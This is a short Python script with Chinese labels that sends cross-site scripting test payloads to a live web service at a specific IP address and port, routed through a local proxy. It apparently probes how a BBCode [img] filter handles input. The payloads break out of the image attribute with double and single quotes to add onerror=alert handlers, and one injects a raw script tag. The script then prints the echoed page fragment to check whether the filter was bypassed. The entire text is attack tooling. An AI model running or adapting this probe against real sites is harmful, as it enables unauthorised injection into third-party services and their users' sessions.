import re, urllib.request, urllib.parse, urllib.error
BASE = "http://160.202.254.160:15880/"
PROXY = {"http": "http://127.0.0.1:12001", "https": "http://127.0.0.1:12001"}
op = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))

def get(data=None):
    d = urllib.parse.urlencode(data).encode() if data is not None else None
    with op.open(BASE, data=d, timeout=20) as r:
        return r.read().decode("gb18030", "replace")

def postmark(mark):
    body = get({"content": mark})
    i = body.rfind("<pre>")
    return body[i:i+400] if i >= 0 else "(未找到pre)"

tests = {
    "img正常":      "M1[img]http://a.b/c.png[/img]M1END",
    "img引号突破":  'M2[img]http://a.b/c.png" onerror="alert(1)[/img]M2END',
    "img单引号":    "M3[img]http://a.b/c.png' onerror='alert(2)[/img]M3END",
    "尖括号":       "M4<script>alert(3)</script>M4END",
}
for name, payload in tests.items():
    print("[%s]" % name)
    print("  SENT :", payload)
    print("  ECHO :", postmark(payload))
